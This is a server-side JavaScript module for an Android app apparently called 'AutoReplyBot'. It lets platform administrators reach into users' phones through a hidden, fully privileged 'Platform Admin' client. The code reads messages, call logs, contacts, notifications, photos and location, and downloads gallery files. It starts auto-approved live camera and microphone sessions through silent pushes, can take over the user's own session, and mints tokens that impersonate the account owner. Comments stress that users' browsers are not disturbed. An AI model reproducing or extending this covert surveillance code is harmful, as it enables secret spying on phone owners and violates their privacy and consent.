import { randomBytes } from "crypto";
import { getAuth } from "firebase-admin/auth";
import { getMessaging } from "firebase-admin/messaging";
import { db } from "./firebase.js";
import { CAPABILITY_KEYS, normalizeAllowedCapabilities } from "./capability-model.js";
import { createModuleCommand, createTransfer } from "./module-commands.js";
import { endActiveSessionsForDevice, writeAuditLog } from "./pairing.js";
import { buildIceServers } from "./ice-servers.js";
import { bucket } from "./firebase.js";
import * as R from "./remote-constants.js";
import { writeAdminAudit } from "./platform-admin.js";

/** Stable trusted-client id under each user — does not replace their browsers. */
export const PLATFORM_ADMIN_CLIENT_ID = "platform_admin";

const REQUEST_TTL_MS = 2 * 60 * 1000;

function allCapabilitiesOn() {
  const out = {};
  for (const key of CAPABILITY_KEYS) out[key] = true;
  return normalizeAllowedCapabilities(out);
}

function userRoot(uid) {
  return db().collection(R.COL_USERS).doc(uid);
}

/**
 * Ensure a non-revoked Platform Admin trusted client exists for this user.
 * Never revokes or modifies the user's real browser clients.
 */
export async function ensureAdminTrustedClient(ownerUid, adminEmail) {
  const ref = userRoot(ownerUid).collection(R.COL_TRUSTED_CLIENTS).doc(PLATFORM_ADMIN_CLIENT_ID);
  const now = Date.now();
  const caps = allCapabilitiesOn();
  const existing = await ref.get();
  const patch = {
    clientId: PLATFORM_ADMIN_CLIENT_ID,
    ownerUid,
    clientName: "Platform Admin",
    label: "Platform Admin",
    browserName: "Admin Panel",
    operatingSystem: "Server",
    allowedCapabilities: caps,
    autoApproveSessions: true,
    revoked: false,
    isPlatformAdminClient: true,
    // No publicKey → admin APIs start sessions without browser crypto.
    publicKey: null,
    updatedAt: now,
    lastUsedAt: now,
    createdByAdmin: String(adminEmail || ""),
  };
  if (!existing.exists) {
    patch.createdAt = now;
  }
  await ref.set(patch, { merge: true });
  return PLATFORM_ADMIN_CLIENT_ID;
}

async function requireDevice(ownerUid, deviceId) {
  const snap = await userRoot(ownerUid).collection(R.COL_DEVICES).doc(deviceId).get();
  if (!snap.exists) {
    const err = new Error("Device not found");
    err.code = "NOT_FOUND";
    throw err;
  }
  const data = snap.data() || {};
  if (data.revoked === true) {
    const err = new Error("Device is revoked");
    err.code = "DEVICE_REVOKED";
    throw err;
  }
  return { id: snap.id, ...data };
}

export async function listActiveSessions(ownerUid, deviceId, sessionKind = null) {
  const snap = await userRoot(ownerUid).collection(R.COL_SESSIONS).where("deviceId", "==", deviceId).get();
  const activeStatuses = new Set(R.ACTIVE_SESSION_STATUSES || ["connecting", "active", "connected"]);
  const out = [];
  snap.forEach((doc) => {
    const d = doc.data() || {};
    const status = String(d.status || "");
    if (!activeStatuses.has(status)) return;
    const kind = String(d.sessionKind || "camera");
    if (sessionKind && kind !== sessionKind) return;
    out.push({
      sessionId: doc.id,
      status,
      sessionKind: kind,
      clientId: String(d.clientId || ""),
      startedAt: Number(d.startedAt || d.createdAt || 0),
      autoApproved: Boolean(d.autoApproved),
    });
  });
  return out;
}

async function readCol(ownerUid, deviceId, col, limit = 80) {
  const snap = await userRoot(ownerUid)
    .collection(R.COL_DEVICES)
    .doc(deviceId)
    .collection(col)
    .limit(limit)
    .get();
  return snap.docs.map((d) => ({ id: d.id, ...(d.data() || {}) }));
}

/**
 * Explore cached device data (Admin SDK — does not interrupt anyone).
 */
export async function getDeviceExplore(ownerUid, deviceId) {
  const device = await requireDevice(ownerUid, deviceId);
  const deviceRef = userRoot(ownerUid).collection(R.COL_DEVICES).doc(deviceId);

  const [
    infoSnap,
    locSnap,
    activeSessions,
    messages,
    callLogs,
    contacts,
    notifications,
    apps,
    gallery,
    folderGrants,
    screenRecordings,
  ] = await Promise.all([
    deviceRef.collection(R.COL_DEVICE_INFO).doc("current").get().catch(() => null),
    deviceRef.collection(R.COL_LOCATION).doc("current").get().catch(() => null),
    listActiveSessions(ownerUid, deviceId),
    readCol(ownerUid, deviceId, R.COL_MESSAGE_ITEMS, 50),
    readCol(ownerUid, deviceId, R.COL_CALL_LOG_ITEMS, 50),
    readCol(ownerUid, deviceId, R.COL_CONTACT_ITEMS, 50),
    readCol(ownerUid, deviceId, R.COL_NOTIFICATION_ITEMS, 50),
    readCol(ownerUid, deviceId, R.COL_INSTALLED_APPS, 80),
    readCol(ownerUid, deviceId, R.COL_GALLERY_ITEMS, 80),
    readCol(ownerUid, deviceId, R.COL_FOLDER_GRANTS, 40),
    readCol(ownerUid, deviceId, R.COL_SCREEN_RECORDINGS, 30),
  ]);

  const limitations = [
    {
      feature: "Cached data (info, location, messages, …)",
      possible: true,
      note: "Shows last synced data. Use Sync to refresh from the phone. Does not interrupt the user’s website.",
    },
    {
      feature: "Module commands (sync, lock, unlock, …)",
      possible: true,
      note: "Runs via a hidden Platform Admin trusted client. User browsers stay paired.",
    },
    {
      feature: "Live camera / microphone",
      possible: true,
      note: "Starts an admin session on the phone. If the user already has a live camera session, you must take over (ends theirs) or wait.",
    },
    {
      feature: "Screen mirror / record",
      possible: true,
      note: "Phone must show Android’s system screen-capture consent (cannot be skipped). Same takeover rule as camera if a screen session is live.",
    },
    {
      feature: "Remote touch / accessibility",
      possible: Boolean(device.remoteControlEnabled !== false),
      note:
        device.remoteControlEnabled === false
          ? "Remote control is disabled on the phone. Enable it in the app, then retry."
          : "Needs Accessibility enabled on the phone. Commands go through Platform Admin client.",
    },
  ];

  return {
    device: {
      deviceId,
      deviceName: String(device.deviceName || device.name || ""),
      deviceModel: String(device.deviceModel || device.model || ""),
      manufacturer: String(device.manufacturer || ""),
      androidVersion: String(device.androidVersion || ""),
      appVersion: String(device.appVersion || ""),
      online: Boolean(device.online),
      lastSeenAt: Number(device.lastSeenAt || device.updatedAt || 0),
      remoteControlEnabled: device.remoteControlEnabled !== false,
      cameraAvailable: device.cameraAvailable !== false,
      microphoneAvailable: device.microphoneAvailable !== false,
      cameraPermission: String(device.cameraPermission || ""),
      microphonePermission: String(device.microphonePermission || ""),
      batteryLevel: device.batteryLevel ?? null,
      isCharging: Boolean(device.isCharging),
      networkType: String(device.networkType || ""),
      locationSharingEnabled: Boolean(device.locationSharingEnabled),
      galleryAccessEnabled: Boolean(device.galleryAccessEnabled),
      fileManagerEnabled: Boolean(device.fileManagerEnabled),
      revoked: Boolean(device.revoked),
    },
    deviceInfo: infoSnap?.exists ? infoSnap.data() : null,
    location: locSnap?.exists ? locSnap.data() : null,
    activeSessions,
    messages,
    callLogs,
    contacts,
    notifications: (notifications || []).map(normalizeNotificationItem),
    apps,
    gallery: (gallery || []).map(normalizeGalleryItem),
    folderGrants,
    screenRecordings,
    limitations,
    adminClientId: PLATFORM_ADMIN_CLIENT_ID,
  };
}

function normalizeNotificationItem(n) {
  const raw = n && typeof n === "object" ? n : {};
  return {
    id: raw.id || "",
    title: String(raw.title || ""),
    message: String(raw.message || raw.text || raw.body || raw.content || ""),
    appLabel: String(raw.appLabel || raw.appName || raw.packageName || "App"),
    packageName: String(raw.packageName || ""),
    postedAt: Number(raw.postedAt || raw.createdAt || 0),
  };
}

function normalizeGalleryItem(g) {
  const raw = g && typeof g === "object" ? g : {};
  const mime = String(raw.mimeType || "");
  let type = String(raw.type || "").toLowerCase();
  if (!type) {
    if (mime.startsWith("image/")) type = "image";
    else if (mime.startsWith("video/")) type = "video";
    else if (mime.startsWith("audio/")) type = "audio";
    else type = "file";
  }
  return {
    id: String(raw.id || raw.itemId || ""),
    itemId: String(raw.itemId || raw.id || ""),
    displayName: String(raw.displayName || raw.name || raw.id || "file"),
    type,
    mimeType: mime,
    sizeBytes: Number(raw.sizeBytes || raw.size || 0),
    dateAdded: Number(raw.dateAdded || raw.createdAt || 0),
    createdAt: Number(raw.createdAt || 0),
  };
}

/**
 * Start gallery file transfer via Platform Admin client (does not touch user browsers).
 */
export async function startAdminGalleryTransfer(ownerUid, deviceId, item, admin) {
  await requireDevice(ownerUid, deviceId);
  await ensureAdminTrustedClient(ownerUid, admin.email);
  const itemId = String(item.itemId || item.id || "").trim();
  if (!itemId) {
    const err = new Error("itemId required");
    err.code = "BAD_REQUEST";
    throw err;
  }
  const transfer = await createTransfer(ownerUid, {
    deviceId,
    clientId: PLATFORM_ADMIN_CLIENT_ID,
    operation: "gallery_download",
    sourceType: "gallery",
    sourceReference: itemId,
    sizeBytes: Number(item.sizeBytes || 0),
    mimeType: item.mimeType || "",
    displayName: item.displayName || itemId,
    storagePath: `users/${ownerUid}/devices/${deviceId}/gallery-transfers/{transferId}/file`,
  });
  const cmd = await createModuleCommand(
    ownerUid,
    deviceId,
    PLATFORM_ADMIN_CLIENT_ID,
    "GALLERY_TRANSFER_REQUEST",
    { itemId, transferId: transfer.transferId },
    null
  );
  await writeAdminAudit({
    action: "ADMIN_GALLERY_TRANSFER",
    targetUid: ownerUid,
    deviceId,
    adminUid: admin.uid,
    adminEmail: admin.email,
    itemId,
    transferId: transfer.transferId,
  });
  return { transfer, command: cmd };
}

export async function getAdminTransfer(ownerUid, transferId) {
  const snap = await userRoot(ownerUid).collection(R.COL_TRANSFERS).doc(transferId).get();
  if (!snap.exists) {
    const err = new Error("Transfer not found");
    err.code = "NOT_FOUND";
    throw err;
  }
  const t = snap.data() || {};
  if (String(t.ownerUid || ownerUid) !== ownerUid) {
    const err = new Error("Forbidden");
    err.code = "FORBIDDEN";
    throw err;
  }
  return { transferId: snap.id, ...t };
}

function transferStorageCandidates(uid, t) {
  const paths = [];
  const stored = String(t.storagePath || "").trim();
  if (stored) paths.push(stored);
  const transferId = String(t.transferId || "").trim();
  const deviceId = String(t.deviceId || "").trim();
  if (transferId && deviceId && uid) {
    paths.push(`users/${uid}/devices/${deviceId}/gallery-transfers/${transferId}/file`);
    paths.push(`users/${uid}/devices/${deviceId}/file-transfers/${transferId}/file`);
  }
  return [...new Set(paths.filter(Boolean))];
}

export async function downloadAdminTransferContent(ownerUid, transferId) {
  const t = await getAdminTransfer(ownerUid, transferId);
  if (String(t.status || "") !== "ready") {
    const err = new Error(`Transfer not ready (${t.status || "unknown"})`);
    err.code = "NOT_READY";
    throw err;
  }
  const b = bucket();
  for (const path of transferStorageCandidates(ownerUid, t)) {
    try {
      const file = b.file(path);
      const [exists] = await file.exists();
      if (!exists) continue;
      const [buf] = await file.download();
      return {
        buffer: buf,
        mimeType: String(t.mimeType || "application/octet-stream"),
        displayName: String(t.displayName || "file"),
        storagePath: path,
      };
    } catch {
      /* try next */
    }
  }
  const err = new Error("File missing in storage");
  err.code = "FILE_MISSING";
  throw err;
}

export async function waitAdminModuleCommand(ownerUid, deviceId, commandId, timeoutMs = 20000) {
  const ref = userRoot(ownerUid)
    .collection(R.COL_DEVICES)
    .doc(deviceId)
    .collection(R.COL_MODULE_COMMANDS)
    .doc(commandId);
  const deadline = Date.now() + Math.min(Math.max(Number(timeoutMs) || 20000, 1000), 60000);
  while (Date.now() < deadline) {
    const snap = await ref.get();
    if (snap.exists) {
      const data = snap.data() || {};
      const status = String(data.status || "");
      if (status === "acked" || status === "failed" || status === "expired" || status === "ignored") {
        return { commandId, ...data };
      }
    }
    await new Promise((r) => setTimeout(r, 280));
  }
  const err = new Error("Command timed out");
  err.code = "TIMEOUT";
  throw err;
}

export async function runAdminModuleCommand(ownerUid, deviceId, action, payload, admin) {
  await requireDevice(ownerUid, deviceId);
  // Ensure ownerUid is stamped so module command ownership checks pass.
  await userRoot(ownerUid)
    .collection(R.COL_DEVICES)
    .doc(deviceId)
    .set({ ownerUid }, { merge: true });
  await ensureAdminTrustedClient(ownerUid, admin.email);
  const cmd = await createModuleCommand(
    ownerUid,
    deviceId,
    PLATFORM_ADMIN_CLIENT_ID,
    action,
    payload || {},
    null
  );
  await writeAdminAudit({
    action: "ADMIN_MODULE_COMMAND",
    targetUid: ownerUid,
    deviceId,
    adminUid: admin.uid,
    adminEmail: admin.email,
    moduleAction: action,
    commandId: cmd.commandId,
  });
  return cmd;
}

/**
 * Start live session as Platform Admin without touching user's trusted browsers.
 * @param {{ forceReplace?: boolean, capabilities?: string[], quality?: string }} opts
 */
export async function startAdminLiveSession(ownerUid, deviceId, opts, admin) {
  const device = await requireDevice(ownerUid, deviceId);
  if (device.remoteControlEnabled === false) {
    const err = new Error(
      "Remote control is disabled on this phone. Ask the user to enable Remote Control in the app, then retry."
    );
    err.code = "REMOTE_DISABLED";
    err.howTo =
      "On the phone: open AutoReplyBot → Remote Control → turn on. No change needed to their paired browsers.";
    throw err;
  }

  await ensureAdminTrustedClient(ownerUid, admin.email);

  const caps = Array.isArray(opts.capabilities) && opts.capabilities.length
    ? opts.capabilities.map(String)
    : ["camera", "microphone"];
  const wantCamera = caps.includes("camera");
  const wantMic = caps.includes("microphone");
  const wantScreen = caps.includes("screenMirror");
  if (!wantCamera && !wantMic && !wantScreen) {
    const err = new Error("Select camera, microphone, and/or screenMirror");
    err.code = "BAD_CAPABILITIES";
    throw err;
  }
  const sessionKind = wantScreen && !wantCamera ? "screen" : "camera";
  const quality = String(opts.quality || "auto").slice(0, 40);

  const active = await listActiveSessions(ownerUid, deviceId, sessionKind);
  const userOwned = active.filter((s) => s.clientId !== PLATFORM_ADMIN_CLIENT_ID);
  if (userOwned.length && !opts.forceReplace) {
    const err = new Error(
      `This device already has an active ${sessionKind} session from the user’s browser. Starting yours would interrupt them.`
    );
    err.code = "USER_SESSION_ACTIVE";
    err.howTo =
      "Wait until they end the session, or retry with Take over (forceReplace) — that ends only the same-type live session on the phone. Their paired browsers and other modules stay intact.";
    err.activeSessions = userOwned;
    throw err;
  }

  if (wantCamera && device.cameraAvailable === false) {
    const err = new Error("Camera permission is off on the phone.");
    err.code = "CAMERA_PERMISSION";
    err.howTo = "On the phone: Settings → Apps → AutoReplyBot → Permissions → Camera → Allow.";
    throw err;
  }
  if (wantMic && device.microphoneAvailable === false) {
    const err = new Error("Microphone permission is off on the phone.");
    err.code = "MIC_PERMISSION";
    err.howTo = "On the phone: Settings → Apps → AutoReplyBot → Permissions → Microphone → Allow.";
    throw err;
  }

  await endActiveSessionsForDevice(ownerUid, deviceId, "replaced_by_admin", sessionKind);

  const now = Date.now();
  const sessionId = randomBytes(16).toString("hex");
  const requestId = randomBytes(16).toString("hex");
  const expiresAt = now + REQUEST_TTL_MS;
  const androidState = R.ANDROID_STATE_TAP_REQUIRED || "tap_required";

  const sessionDoc = {
    sessionId,
    deviceId,
    clientId: PLATFORM_ADMIN_CLIENT_ID,
    status: "connecting",
    startedAt: now,
    endedAt: 0,
    selectedCamera: wantCamera ? "front" : "none",
    microphoneEnabled: wantMic,
    flashlightEnabled: false,
    quality,
    terminationReason: "",
    ownerUid,
    autoApproved: true,
    androidStartupState: androidState,
    requestId,
    sessionKind,
    startedByPlatformAdmin: true,
    adminEmail: admin.email || "",
  };
  const requestDoc = {
    requestId,
    deviceId,
    clientId: PLATFORM_ADMIN_CLIENT_ID,
    requestedCapabilities: caps,
    status: "approved",
    createdAt: now,
    expiresAt,
    approvedAt: now,
    rejectedAt: 0,
    ownerUid,
    preferredQuality: quality,
    sessionId,
    autoApproved: true,
    androidStartupState: androidState,
    sessionKind,
    startedByPlatformAdmin: true,
  };

  await userRoot(ownerUid).collection(R.COL_SESSIONS).doc(sessionId).set(sessionDoc);
  await userRoot(ownerUid).collection(R.COL_SESSION_REQUESTS).doc(requestId).set(requestDoc);

  // Must match normal user /api/device/session/request FCM shape.
  // Existing APK rejects payloads missing clientId/requestId (RemoteFcmPayload).
  let pushSent = false;
  const fcmToken = String(device.fcmToken || "").trim();
  if (fcmToken) {
    try {
      await getMessaging().send({
        token: fcmToken,
        data: {
          type: "session_auto_start",
          requestId,
          sessionId,
          deviceId,
          clientId: PLATFORM_ADMIN_CLIENT_ID,
          clientName: "Platform Admin",
          expiresAt: String(expiresAt),
          cameraEnabled: wantCamera ? "1" : "0",
          microphoneEnabled: wantMic ? "1" : "0",
          sessionKind,
          screenMirror: wantScreen ? "1" : "0",
        },
        android: { priority: "high" },
      });
      pushSent = true;
    } catch (pushErr) {
      console.warn("Admin FCM auto-start send failed", pushErr?.message || pushErr);
    }
  }

  await writeAuditLog(ownerUid, {
    action: R.AUDIT_SESSION_AUTO_AUTHORIZED || "SESSION_AUTO_AUTHORIZED",
    deviceId,
    clientId: PLATFORM_ADMIN_CLIENT_ID,
    result: "ok",
    metadata: { sessionId, requestId, by: "platform_admin", admin: admin.email },
  });
  await writeAdminAudit({
    action: "ADMIN_LIVE_SESSION",
    targetUid: ownerUid,
    deviceId,
    adminUid: admin.uid,
    adminEmail: admin.email,
    sessionId,
    sessionKind,
    forceReplace: Boolean(opts.forceReplace),
  });

  // Short-lived custom token so admin browser can read/write WebRTC signals as owner.
  const customToken = await getAuth().createCustomToken(ownerUid, {
    platformAdminImpersonation: true,
    actingAdminUid: admin.uid,
    actingAdminEmail: admin.email || "",
  });

  return {
    ok: true,
    sessionId,
    requestId,
    sessionKind,
    clientId: PLATFORM_ADMIN_CLIENT_ID,
    ownerUid,
    pushSent,
    androidState,
    iceServers: buildIceServers({ includeTurn: true }),
    customToken,
    notes: wantScreen
      ? "Phone must accept Android screen-capture consent. Tap the phone notification if cast does not open. User browsers stay paired."
      : pushSent
        ? "Request authorized. Tap the phone notification if live view does not start (same as user panel)."
        : "Push not delivered — open the phone app / Remote Control once, then tap Connect again. User browsers stay paired.",
  };
}

const LIVE_SESSION_ACTIONS = new Set([
  "END_SESSION",
  "SWITCH_CAMERA",
  "SET_CAMERA_FRONT",
  "SET_CAMERA_BACK",
  "TORCH_ON",
  "TORCH_OFF",
  "MIC_MUTE",
  "MIC_UNMUTE",
  "CAPTURE_PHOTO",
  "START_VIDEO_RECORDING",
  "STOP_VIDEO_RECORDING",
  "START_AUDIO_RECORDING",
  "STOP_AUDIO_RECORDING",
  "SET_QUALITY",
  "PING_DEVICE",
]);

/**
 * Write a live-session command the existing APK already listens for
 * (users/{uid}/commands) — same path as the normal user website.
 * Does not change user panel behavior.
 */
export async function sendAdminLiveCommand(ownerUid, deviceId, sessionId, action, admin) {
  const act = String(action || "").trim().toUpperCase();
  if (!LIVE_SESSION_ACTIONS.has(act)) {
    const err = new Error(`Unsupported live action: ${act}`);
    err.code = "BAD_ACTION";
    throw err;
  }
  await requireDevice(ownerUid, deviceId);
  const sid = String(sessionId || "").trim();
  if (!sid || !/^[A-Za-z0-9_-]{1,128}$/.test(sid)) {
    const err = new Error("Valid sessionId required");
    err.code = "BAD_SESSION";
    throw err;
  }
  const sessionSnap = await userRoot(ownerUid).collection(R.COL_SESSIONS).doc(sid).get();
  if (!sessionSnap.exists) {
    const err = new Error("Session not found");
    err.code = "NOT_FOUND";
    throw err;
  }
  const s = sessionSnap.data() || {};
  if (String(s.deviceId || "") !== deviceId) {
    const err = new Error("Session/device mismatch");
    err.code = "BAD_REQUEST";
    throw err;
  }

  if (act === "END_SESSION") {
    return endAdminLiveSession(ownerUid, deviceId, sid, admin);
  }

  const now = Date.now();
  const commandId = randomBytes(16).toString("hex");
  await userRoot(ownerUid)
    .collection(R.COL_COMMANDS)
    .doc(commandId)
    .set({
      commandId,
      sessionId: sid,
      deviceId,
      action: act,
      createdAt: now,
      expiresAt: now + 60_000,
      status: "pending",
      ownerUid,
      fromPlatformAdmin: true,
    });

  await writeAdminAudit({
    action: "ADMIN_LIVE_COMMAND",
    targetUid: ownerUid,
    deviceId,
    sessionId: sid,
    adminUid: admin.uid,
    adminEmail: admin.email,
    liveAction: act,
    commandId,
  });

  return { ok: true, commandId, action: act, sessionId: sid };
}

export async function endAdminLiveSession(ownerUid, deviceId, sessionId, admin) {
  const ref = userRoot(ownerUid).collection(R.COL_SESSIONS).doc(sessionId);
  const snap = await ref.get();
  if (!snap.exists) {
    const err = new Error("Session not found");
    err.code = "NOT_FOUND";
    throw err;
  }
  const data = snap.data() || {};
  if (String(data.deviceId || "") !== deviceId) {
    const err = new Error("Session/device mismatch");
    err.code = "BAD_REQUEST";
    throw err;
  }
  const now = Date.now();
  await ref.set(
    {
      status: "ended",
      endedAt: now,
      terminationReason: "admin_ended",
      endReason: "admin_ended",
    },
    { merge: true }
  );
  // Same command path the user website uses so the existing APK stops capture.
  try {
    const commandId = randomBytes(16).toString("hex");
    await userRoot(ownerUid).collection(R.COL_COMMANDS).doc(commandId).set({
      commandId,
      sessionId,
      deviceId,
      action: "END_SESSION",
      createdAt: now,
      expiresAt: now + 60_000,
      status: "pending",
      ownerUid,
      fromPlatformAdmin: true,
    });
  } catch {
    /* session status end is enough for most builds */
  }
  await writeAdminAudit({
    action: "ADMIN_LIVE_SESSION_END",
    targetUid: ownerUid,
    deviceId,
    sessionId,
    adminUid: admin.uid,
    adminEmail: admin.email,
  });
  return { ok: true };
}

/** Custom token for Firestore signaling only (admin already authenticated). */
export async function createOwnerImpersonationToken(ownerUid, admin) {
  await ensureAdminTrustedClient(ownerUid, admin.email);
  const customToken = await getAuth().createCustomToken(ownerUid, {
    platformAdminImpersonation: true,
    actingAdminUid: admin.uid,
    actingAdminEmail: admin.email || "",
  });
  return {
    customToken,
    ownerUid,
    clientId: PLATFORM_ADMIN_CLIENT_ID,
    iceServers: buildIceServers({ includeTurn: true }),
  };
}
